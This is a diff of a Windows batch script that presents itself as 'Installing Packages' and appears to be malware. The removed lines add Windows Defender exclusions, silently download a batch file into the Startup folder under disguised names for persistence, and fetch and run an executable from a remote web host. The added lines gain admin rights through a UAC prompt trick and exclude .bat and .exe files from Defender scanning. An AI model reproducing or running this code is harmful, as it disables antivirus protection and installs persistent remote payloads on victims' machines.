@@ -1,23 +1,26 @@
-@whoami /groups | find "S-1-16-12288" > nul
-@if errorlevel 1 echo Start-Process cmd '/C ""%~f0" %*"' -Verb RunAs | PowerShell - & exit /b
+@echo off
 
-:: Displays the original command line that invoked the Command Processor
-echo %CMDCMDLINE%
-PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath C:\Users\Public""' -Verb RunAs"
-PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .exe""' -Verb RunAs"
-PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .bat""' -Verb RunAs"
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\ANTI.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\BOOT2.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\RESTART.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\Minicaculator.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\BOOT.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\SETTING.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\AUDIO.bat";
-powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/NHTBOT/NHT/main/Winsecure.bat  -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\FIX.bat";
+title Installing Packages 
+:: BatchGotAdmin
+::-----------------------------------------
+REM  --> CheckING for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-powershell -windowstyle hidden Invoke-WebRequest -URI https://serverwebhook.000webhostapp.com/Client.txt -OutFile C:\\Users\\Public\\Document.exe;
-powershell -windowstyle Hidden Start-Process -FilePath "C:\Users\Public\Document.exe"
-powershell -windowstyle hidden Invoke-WebRequest -URI https://serverwebhook.000webhostapp.com/Client.txt -OutFile C:\\Users\\Public\\Document.exe;
-powershell -windowstyle Hidden Start-Process -FilePath "C:\Users\Public\Document.exe"
-pause >nul
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"="
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
